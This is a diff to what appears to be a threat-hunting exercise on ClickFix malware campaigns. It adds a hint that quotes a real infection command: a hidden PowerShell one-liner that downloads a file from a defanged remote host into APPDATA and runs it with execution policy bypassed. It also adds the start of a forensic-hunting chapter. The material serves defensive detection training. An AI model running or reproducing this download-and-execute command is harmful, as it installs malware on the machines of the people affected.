@@ -100,6 +100,14 @@ DeviceRegistryEvents
 <details>
 <summary>Tip 2</summary>
 Identity the common delimitors of the ClickFix campains, what are the lolbins that are used to drop the malware and which parameters are used to stay undetected by the user?
+
+In the clickfix triage query the intial infection is started by running:
+
+⚠️ This is real malware, do not execute unless you are sure you accept the risk of being hacked.
+
+```PowerShell
+powershell -w h -nop -c "$s=Join-Path $env:APPDATA 'djw\6kn9.ps1';md (Split-Path $s) -ea 0;$l='https://cbtechnic[.]com/0.wav';iwr $l -OutFile $s;& powershell -w h -ep Bypass -f $s"
+```
 </details>
 
 <details>
@@ -115,3 +123,6 @@ DeviceRegistryEvents
 | project-reorder Timestamp, DeviceId, DeviceName, RegistryValueData, RegistryKey
 ```
 </details>
+
+# Bonus: Forensic Hunting
+This chapter uses the [triage query](#clickfix-triage) as starting point and uncovers the post-compromise activities based on this infection. 
